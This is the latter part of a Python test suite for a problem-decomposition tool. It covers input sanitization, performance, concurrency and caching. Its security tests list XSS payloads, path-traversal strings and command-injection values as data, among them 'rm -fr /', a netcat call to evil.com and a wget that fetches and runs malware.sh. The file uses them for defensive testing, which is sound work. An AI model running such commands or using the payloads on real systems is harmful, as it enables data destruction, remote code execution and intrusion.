            '<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>',
            '<img src="x" onerror="alert(\'xss\')">',

            # Event handlers
            '<img src="none" onload="alert(\'xss\')">',
            '<div onclick="javascript:alert(\'xss\')">Click me</div>',
            '<button onmouseover="document.location=\'http://evil.com\'">Hover</button>',

            # JavaScript protocol
            '<a href="javascript:alert(\'xss\')">Link</a>',
            '<img src="x" href="javascript:alert(\'xss\')">',

            # Embedded JS
            '<svg onload=alert("xss")>',
            '<math><mi xlink:href="javascript:alert(\'xss\')">click</mi></math>',
            
            # HTML entity encoding bypass
            '&#x3C;script&#x3E;alert("xss")&#x3C;/script&#x3E;',
            '&lt;script&gt;alert("xss")&lt;/script&gt;',
            
            # CSS injection
            '<style>body{background:url("javascript:alert(\'xss\')")}</style>',
            '<div style="background-image:url(javascript:alert(\'xss\'))">Test</div>',
        ]
        
        for payload in xss_payloads:
            with self.subTest(payload=payload[:50]):
                # Test validation on various fields
                test_fields = ["title", "description", "comment", "feedback"]
                
                for field_name in test_fields:
                    try:
                        # This should sanitize the XSS payload
                        if hasattr(self.validator, '_sanitize_html'):
                            cleaned = self.validator._sanitize_html(payload, field_name)
                            # Should not contain dangerous elements after sanitization
                            self.assertNotIn('<script', cleaned.lower(), f"XSS payload not properly cleaned in {field_name}: {payload[:30]}...")
                            self.assertNotIn('javascript:', cleaned.lower(), f"XSS payload not properly cleaned in {field_name}: {payload[:30]}...")
                        else:
                            # If no sanitization method exists, test that validation catches it differently
                            pass
                    except Exception as e:
                        # If validation throws an exception for malicious input, that's also acceptable
                        pass
    
    def test_path_traversal_attempts(self):
        """Test path traversal prevention"""
        traversal_attempts = [
            "../../../../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/../../../proc/self/environ", 
            "%2e%2e%2f" * 5 + "etc/passwd",  # URL encoded
            "..%2f" * 5 + "windows/system.ini",  # Mixed encoding
            "/var/lib/../shadow",
            "../../../boot.ini",
            "....//....//....//etc/passwd",  # Alternative separators
        ]
        
        for traversal in traversal_attempts:
            with self.subTest(traversal=traversal):
                # This should be handled safely - no file system access from user input
                # The system should validate/truncate/sanitize paths appropriately
                
                # In a real system, this might be used for file uploads or naming
                # We'll test that basic validation handles malicious paths
                try:
                    # Simulate using the traversal attempt as a filename
                    # The system should reject or sanitize these safely
                    safe_name = self._sanitize_filename(traversal)
                    # Should not contain path traversal sequences
                    self.assertNotIn("../", safe_name)
                    self.assertNotIn("..\\", safe_name)
                    self.assertNotIn("etc/passwd", safe_name)
                except Exception:
                    # Exception during path handling is also acceptable for malicious input
                    pass
    
    def _sanitize_filename(self, filename: str) -> str:
        """Simple filename sanitization for testing"""
        import re
        # Remove path traversal sequences
        sanitized = re.sub(r'\.\.\/', '', filename)
        sanitized = re.sub(r'\.\\\.+', '', sanitized)
        # Remove non-alphanumeric chars except common safe ones
        sanitized = re.sub(r'[^\w\-_\.]', '_', sanitized)
        return sanitized[:255]  # Limit length
    
    def test_command_injection_attempts(self):
        """Test command injection prevention"""
        cmd_injection_attempts = [
            "test; rm -fr /",
            "test && whoami",
            "test || echo 'failed' && ls -la",
            "test `whoami` test",
            "test $(whoami) test",
            "test; cat /etc/passwd #",
            "test | nc evil.com 2222",
            "test; wget http://evil.com/malware.sh; chmod +x malware.sh; ./malware.sh",
            "test; perl -e 'print \"X\"x1000'",
            "test\nsleep 10\n",
        ]
        
        # These should be handled safely by input validation
        for injection in cmd_injection_attempts:
            with self.subTest(injection=injection[:30]):
                # Input validation should properly sanitize or reject these
                try:
                    # Test that basic validation catches these
                    validated = self.validator.validate_input(
                        injection,
                        "test_field",
                        [self.validator.VALIDATION_RULES.NOT_EMPTY]
                    )
                    # Result should be safe to use (either sanitized or rejected)
                    self.assertIsNotNone(validated)
                except Exception:
                    # Exception is acceptable for malicious input
                    pass


class TestPerformanceUnderExtremeConditions(unittest.TestCase):
    """Test performance and behavior under extreme conditions"""
    
    def test_memory_usage_with_large_datasets(self):
        """Test memory usage when processing large amounts of data"""
        import gc
        import psutil
        import os
        
        # Get baseline memory usage
        process = psutil.Process(os.getpid())
        baseline_memory = process.memory_info().rss / 1024 / 1024  # MB
        
        # Create a large number of objects to test memory management
        large_problem_set = []
        
        for i in range(1000):  # Create 1000 problems
            problem = ProblemDefinition(
                id=generate_id(f"perf_test_{i}"),
                title=f"Performance Test Problem {i}",
                description=f"This is performance test problem number {i} with substantial content to test memory usage. " + "Detailed content here. " * 20,
                problem_type=ProblemType.RESEARCH,
                domain_context=DomainContext(domain="performance_test"),
                complexity_score=ComplexityScore(
                    explanation=f"Performance test problem {i}",
                    cognitive_complexity=5.0 + (i % 3),
                    computational_complexity=5.0 + (i % 3),
                    domain_complexity=5.0 + (i % 3),
                    integration_complexity=5.0 + (i % 3),
                    overall_complexity=5.0 + (i % 3)
                )
            )
            large_problem_set.append(problem)
        
        # Create sub-problems as well
        sub_problems_set = []
        for i in range(5000):  # 5x more sub-problems
            sub = SubProblem(
                id=generate_id(f"sub_perf_{i}"),
                parent_id=generate_id("perf_parent"),
                title=f"Performance Sub-problem {i}",
                description=f"Sub-problem {i} from performance test with detailed description. " + "More details. " * 10,
                type=random.choice(list(SubProblemType)),
                complexity_score=ComplexityScore(
                    explanation=f"Performance sub-problem {i}",
                    cognitive_complexity=4.0 + (i % 4),
                    computational_complexity=4.0 + (i % 4),
                    domain_complexity=4.0 + (i % 4),
                    integration_complexity=4.0 + (i % 4),
                    overall_complexity=4.0 + (i % 4)
                )
            )
            sub_problems_set.append(sub)
        
        # Force garbage collection
        gc.collect()
        
        # Check memory usage after creating large datasets
        peak_memory = process.memory_info().rss / 1024 / 1024
        memory_increase = peak_memory - baseline_memory
        
        print(f"Memory usage: Baseline {baseline_memory:.1f}MB -> Peak {peak_memory:.1f}MB (Increase: {memory_increase:.1f}MB)")
        
        # Memory increase should be reasonable (less than 100MB for this test)
        self.assertLess(memory_increase, 100.0, f"Memory usage increased too much: {memory_increase:.1f}MB")
        
        # Clean up
        del large_problem_set
        del sub_problems_set
        gc.collect()
        
        # Check memory after cleanup
        cleanup_memory = process.memory_info().rss / 1024 / 1024
        cleanup_increase = cleanup_memory - baseline_memory
        
        print(f"Memory after cleanup: {cleanup_memory:.1f}MB (Net increase: {cleanup_increase:.1f}MB)")
        
        # After cleanup, memory should be reasonably close to baseline
        self.assertLess(cleanup_increase, memory_increase * 0.5, "Memory not properly released after cleanup")
    
    def test_concurrent_decomposition_performance(self):
        """Test performance under concurrent decomposition operations"""
        import concurrent.futures
        import time
        from threading import Thread
        
        # Create a shared database for all operations
        db = SovereignDatabase(":memory:")
        
        # Create problems for concurrent processing
        problems = []
        for i in range(50):
            problem = ProblemDefinition(
                id=generate_id(f"concurrent_{i}"),
                title=f"Concurrent Problem {i}",
                description=f"Problem {i} for concurrent processing test. " + "This is a moderately complex problem description that requires some analysis. " * 5,
                problem_type=ProblemType.RESEARCH,
                domain_context=DomainContext(domain="concurrent_test"),
                complexity_score=ComplexityScore(
                    explanation=f"Concurrent problem {i}",
                    cognitive_complexity=5.0,
                    computational_complexity=5.0,
                    domain_complexity=5.0,
                    integration_complexity=5.0,
                    overall_complexity=5.0
                )
            )
            problems.append(problem)
        
        # Store problems in database
        for problem in problems:
            db.create_problem(problem)
        
        # Mock the OpenEvolve client for decomposition
        with patch('decomposition_engine.OpenEvolveClient') as mock_openevolve:
            mock_client = mock_openevolve.return_value
            mock_response = Mock()
            mock_response.success = True
            mock_response.best_code = json.dumps([
                {
                    "id": generate_id("concurrent_sub"),
                    "description": "Generated sub-problem for concurrent test",
                    "dependencies": [],
                    "ai_suggested_complexity_score": 5.5,
                    "ai_suggested_evaluation_prompt": "Validate concurrent operation"
                }
            ])
            mock_client.evolve.return_value = mock_response
            
            # Create decomposition engine
            engine = DecompositionEngine(openevolve_client=mock_client)
            
            # Run concurrent decomposition operations
            start_time = time.time()
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                # Submit jobs for concurrent decomposition
                futures = []
                for problem in problems:
                    future = executor.submit(engine.decompose, problem, "semantic")
                    futures.append(future)
                
                # Collect results
                results = []
                for future in concurrent.futures.as_completed(futures, timeout=30):  # 30s timeout
                    try:
                        result = future.result(timeout=5)  # 5s per operation timeout
                        results.append(result)
                    except concurrent.futures.TimeoutError:
                        print("Concurrent decomposition operation timed out")
                        results.append(None)
                    except Exception as e:
                        print(f"Concurrent decomposition failed: {e}")
                        results.append(None)
            
            total_time = time.time() - start_time
            successful_results = [r for r in results if r is not None]
            
            print(f"Concurrent decomposition: {len(successful_results)}/{len(problems)} succeeded in {total_time:.2f}s")
            print(f"Throughput: {len(successful_results)/total_time:.2f} operations/second")
            
            # Most operations should succeed
            self.assertGreaterEqual(len(successful_results), len(problems) * 0.8,
                                  f"At least 80% of concurrent operations should succeed")
            
            # Should complete in reasonable time (less than 10 seconds for 50 operations)
            self.assertLess(total_time, 10.0, f"Concurrent operations took too long: {total_time:.2f}s")
    
    def test_database_performance_under_load(self):
        """Test database performance under load conditions"""
        import time
        
        db = SovereignDatabase(":memory:")
        
        # Create many problems to test database performance
        test_problems = []
        for i in range(1000):
            problem = ProblemDefinition(
                id=generate_id(f"db_test_{i}"),
                title=f"Database Performance Test {i}",
                description=f"Problem {i} for database performance testing. " + "Performance content. " * 10,
                problem_type=ProblemType.RESEARCH,
                domain_context=DomainContext(domain="performance"),
                complexity_score=ComplexityScore(
                    explanation=f"DB performance test {i}",
                    cognitive_complexity=5.0,
                    computational_complexity=5.0,
                    domain_complexity=5.0,
                    integration_complexity=5.0,
                    overall_complexity=5.0
                )
            )
            test_problems.append(problem)
        
        # Time bulk insert
        start_time = time.time()
        for problem in test_problems:
            db.create_problem(problem)
        insert_time = time.time() - start_time
        
        print(f"Inserted {len(test_problems)} problems in {insert_time:.2f}s ({len(test_problems)/insert_time:.1f} ops/sec)")
        
        # Verify insertion performance
        self.assertLess(insert_time, 5.0, f"Insertion of {len(test_problems)} problems took too long: {insert_time:.2f}s")
        
        # Time bulk retrieval
        start_time = time.time()
        retrieved_problems = db.list_problems()
        retrieval_time = time.time() - start_time
        
        print(f"Retrieved {len(retrieved_problems)} problems in {retrieval_time:.2f}s ({len(retrieved_problems)/retrieval_time:.1f} ops/sec)")
        
        # Verify retrieval performance
        self.assertLess(retrieval_time, 2.0, f"Retrieval of {len(retrieved_problems)} problems took too long: {retrieval_time:.2f}s")
        self.assertEqual(len(retrieved_problems), len(test_problems), "All problems should be retrieved")
        
        # Test complex query performance
        start_time = time.time()
        specific_problems = db.list_problems(problem_type="RESEARCH")
        query_time = time.time() - start_time
        
        print(f"Filtered query returned {len(specific_problems)} results in {query_time:.3f}s")
        self.assertLess(query_time, 1.0, f"Filtered query took too long: {query_time:.3f}s")
        self.assertGreaterEqual(len(specific_problems), 0, "Query should return results")
    
    def test_cache_performance_under_load(self):
        """Test cache performance under high load"""
        import time
        import random
        
        cache = LLMResponseCache()
        
        # Generate test content for cache
        test_items = []
        for i in range(100):
            content = f"Test content item {i} with varied content to test cache performance. " + "More content. " * random.randint(5, 20)
            model_params = {"model": f"model_{i%5}", "temperature": round(random.uniform(0.1, 0.9), 1)}
            response = {"choices": [{"message": {"content": f"Cached response for item {i}"}}]}
            test_items.append((content, model_params, response))
        
        # Test cache performance
        start_time = time.time()
        
        # Bulk insert into cache
        for content, model_params, response in test_items:
            cache.cache_response(content, model_params, response)
        
        cache_insert_time = time.time() - start_time
        
        print(f"Cached {len(test_items)} items in {cache_insert_time:.3f}s")
        self.assertLess(cache_insert_time, 2.0, f"Caching {len(test_items)} items took too long: {cache_insert_time:.3f}s")
        
        # Test cache hit performance with varied access patterns
        start_time = time.time()
        hits = 0
        misses = 0
        
        for i in range(500):  # 5x more accesses than items (to get cache hits)
            # Mostly access existing items to get hits
            if random.random() < 0.8:  # 80% hit rate
                idx = random.randint(0, len(test_items) - 1)
                content, model_params, _ = test_items[idx]
                result = cache.get_response(content, model_params)
                if result:
                    hits += 1
                else:
                    misses += 1
            else:  # 20% access new content for misses
                new_content = f"New content {i}"
                new_params = {"model": "new_model"}
                result = cache.get_response(new_content, new_params)
                if result:
                    hits += 1
                else:
                    misses += 1
        
        cache_access_time = time.time() - start_time
        
        print(f"Cache access: {hits} hits, {misses} misses in {cache_access_time:.3f}s")
        print(f"Hit rate: {hits/(hits+misses)*100:.1f}%, Speed: {(hits+misses)/cache_access_time:.1f} ops/sec")
        
        # Verify cache statistics
        stats = cache.get_stats()
        print(f"Cache stats - Size: {stats['current_size']}, Hits: {stats['total_hits']}, Misses: {stats['total_misses']}")
        
        # Should have good performance
        self.assertLess(cache_access_time, 2.0, f"Cache operations took too long: {cache_access_time:.3f}s")
        self.assertGreaterEqual(stats['total_hits'], hits * 0.7, "Cache hit statistics not consistent")


class TestAdvancedFeatureCombinations(unittest.TestCase):
    """Test combinations of advanced features working together"""
    
    def setUp(self):
        """Set up test fixtures for advanced features"""
        with patch('advanced_features.OpenEvolveClient') as mock_openevolve:
            self.mock_client = mock_openevolve.return_value
            self.advanced_manager = AdvancedFeaturesManager(openevolve_client=self.mock_client)
    
    def test_visual_representation_with_complex_problem(self):
        """Test generating visual representations with complex problems"""
        # Create a complex problem with multiple interconnected sub-problems
        complex_plan = DecompositionPlan(
            id=generate_id("complex_viz"),
            problem_id=generate_id("complex_prob"),
            strategy="dependency",
            sub_problems=[
                SubProblem(
                    id=generate_id("viz_sub1"),
                    parent_id=generate_id("complex_prob"),
                    title="Core Architecture",
                    description="Foundation architecture components",
                    type=SubProblemType.DESIGN,
                    complexity_score=ComplexityScore(
                        explanation="Core architecture",
                        cognitive_complexity=7.0,
                        computational_complexity=6.5,
                        domain_complexity=7.5,
                        integration_complexity=6.0,
                        overall_complexity=6.8
                    )
                ),
                SubProblem(
                    id=generate_id("viz_sub2"),
                    parent_id=generate_id("complex_prob"), 
                    title="Security Layer",
                    description="Security implementation",
                    type=SubProblemType.IMPLEMENTATION,
                    complexity_score=ComplexityScore(
                        explanation="Security implementation",
                        cognitive_complexity=8.0,
                        computational_complexity=7.0,
                        domain_complexity=8.5,
                        integration_complexity=7.5,
                        overall_complexity=7.8
                    ),
                    dependencies=[generate_id("viz_sub1")]  # Depends on Core Architecture
                ),
                SubProblem(
                    id=generate_id("viz_sub3"),
                    parent_id=generate_id("complex_prob"),
                    title="Performance Optimization",
                    description="Performance enhancements",
                    type=SubProblemType.OPTIMIZATION,
                    complexity_score=ComplexityScore(
                        explanation="Performance optimization",
                        cognitive_complexity=7.5,
                        computational_complexity=8.0,
                        domain_complexity=7.0,
                        integration_complexity=8.5,
                        overall_complexity=7.8
                    ),
                    dependencies=[generate_id("viz_sub1"), generate_id("viz_sub2")]  # Depends on both
                ),
                SubProblem(
                    id=generate_id("viz_sub4"),
                    parent_id=generate_id("complex_prob"),
                    title="Monitoring & Observability",
                    description="System monitoring",
                    type=SubProblemType.ANALYSIS,
                    complexity_score=ComplexityScore(
                        explanation="Monitoring & observability",
                        cognitive_complexity=6.5,
                        computational_complexity=6.0,
                        domain_complexity=6.0,
                        integration_complexity=7.0,
                        overall_complexity=6.4
                    ),
                    dependencies=[generate_id("viz_sub3")]  # Depends on Performance
                )
            ],
            dependency_graph={
                generate_id("viz_sub2"): [generate_id("viz_sub1")],
                generate_id("viz_sub3"): [generate_id("viz_sub1"), generate_id("viz_sub2")],
                generate_id("viz_sub4"): [generate_id("viz_sub3")]
            },
            validation_checkpoints=[],
            quality_scores={},
            confidence_level=0.82
        )
        
        # Test different visualization formats
        formats_to_test = ["mermaid", "graphviz", "plantuml", "dot", "svg"]
        
        for viz_format in formats_to_test:
            with self.subTest(format=viz_format):
                try:
                    visualization = self.advanced_manager.generate_visual_representation(
                        complex_plan.to_dict() if hasattr(complex_plan, 'to_dict') else complex_plan.__dict__,
                        format_type=viz_format
                    )
                    
                    # Visualization should be generated successfully
                    self.assertIsNotNone(visualization)
                    self.assertIsInstance(visualization, str)
                    self.assertGreater(len(visualization), 10)  # Should have meaningful content
                    
                    # Check that visualization contains appropriate elements for the format
                    if viz_format == "mermaid":
                        self.assertIn("graph", visualization.lower())
                        self.assertIn(generate_id("viz_sub1"), visualization)  # Check that IDs are represented
                    elif viz_format == "plantuml":
                        self.assertIn("@startuml", visualization)
                        self.assertIn("@enduml", visualization)
                        
                except NotImplementedError:
                    # Some formats might not be implemented yet, which is okay
                    continue
    
    def test_multi_modal_content_processing(self):
        """Test processing of multi-modal content"""
        multi_modal_contents = [
            {
                "type": "text",
                "data": "Natural language description of the problem",
                "metadata": {"source": "user_input", "confidence": 0.9}
            },
            {
                "type": "code",
                "data": "def example_function():\n    return 'Hello, World!'",
                "metadata": {"language": "python", "source": "existing_codebase"}
            },
            {
                "type": "diagram",
                "data": '{"nodes": [{"id": "A", "label": "Start"}, {"id": "B", "label": "Process"}], "edges": [{"from": "A", "to": "B"}]}',
                "metadata": {"format": "json", "created_by": "design_tool"}
            },
            {
                "type": "structured_data", 
                "data": {"key1": "value1", "key2": "value2", "nested": {"subkey": "subvalue"}},
                "metadata": {"format": "json", "source": "api_response"}
            }
        ]
        
        # Process multi-modal content
        processed_content = self.advanced_manager.process_multi_modal_content(multi_modal_contents)
        
        # Should return processed content
        self.assertIsNotNone(processed_content)
        self.assertEqual(len(processed_content), len(multi_modal_contents))
        
        # Each processed item should have a 'processed' field indicating it was handled
        for item in processed_content:
            self.assertIn('type', item)
            self.assertIn('data', item)
            self.assertIn('metadata', item)
            # May have additional processing fields like 'processed', 'analysis', etc.
    
    def test_domain_template_application(self):
        """Test application of domain-specific templates"""
        # Get available templates
        available_templates = self.advanced_manager.get_available_domain_templates()
        self.assertIsInstance(available_templates, dict)
        
        # Test applying a template if any are available
        if available_templates:
            # Pick the first available template and test applying it
            first_domain = next(iter(available_templates))
            template_info = available_templates[first_domain]
            
            # Apply the template to a problem statement
            applied_template = self.advanced_manager.apply_domain_template(
                problem_statement="Example problem in the selected domain",
                domain=first_domain,
                strategy_name="default"  # Use default strategy from template
            )
            
            # Template application should return something (even if it's the original with domain info)
            self.assertIsNotNone(applied_template)
            
            # The result should contain domain-specific information
            if isinstance(applied_template, dict):
                # Should have domain-relevant keys
                self.assertIn('domain', applied_template) or self.assertIn('strategy', applied_template)


def run_ultra_comprehensive_tests():
    """Run ultra-comprehensive tests"""
    print("Running Ultra-Comprehensive Validation Tests...")
    print("="*80)
    
    # Create comprehensive test suite
    suite = unittest.TestSuite()
    
    # Add all test cases
    suite.addTest(unittest.makeSuite(TestComprehensiveDataModelValidation))
    suite.addTest(unittest.makeSuite(TestAnalyzerEdgeCases))
    suite.addTest(unittest.makeSuite(TestDecompositionEngineEdgeCases))
    suite.addTest(unittest.makeSuite(TestAdvancedSecurityScenarios))
    suite.addTest(unittest.makeSuite(TestPerformanceUnderExtremeConditions))
    suite.addTest(unittest.makeSuite(TestAdvancedFeatureCombinations))
    
    # Create test runner with detailed output
    runner = unittest.TextTestRunner(
        verbosity=2,
        stream=sys.stdout,
        descriptions=True,
        buffer=False
    )
    
    start_time = time.time()
    result = runner.run(suite)
    total_time = time.time() - start_time
    
    # Print comprehensive results
    print("\n" + "="*80)
    print("ULTRA-COMPREHENSIVE TEST RESULTS")
    print("="*80)
    print(f"Total execution time: {total_time:.2f} seconds")
    print(f"Tests run: {result.testsRun}")
    print(f"Failures: {len(result.failures)}")
    print(f"Errors: {len(result.errors)}")
    print(f"Success rate: {(result.testsRun - len(result.failures) - len(result.errors)) / result.testsRun * 100:.2f}%")
    
    if result.failures or result.errors:
        print("\nFAILURE DETAILS:")
        for test, trace in result.failures:
            print(f"\nFAILED: {test}")
            print(trace)
        
        print("\nERROR DETAILS:")
        for test, trace in result.errors:
            print(f"\nERROR: {test}")
            print(trace)
    else:
        print(f"\n🎉 ALL {result.testsRun} ULTRA-COMPREHENSIVE TESTS PASSED! 🎉")
        print("System is ready for production with enterprise-grade reliability!")
    
    print("="*80)
    return result


if __name__ == "__main__":
    run_ultra_comprehensive_tests()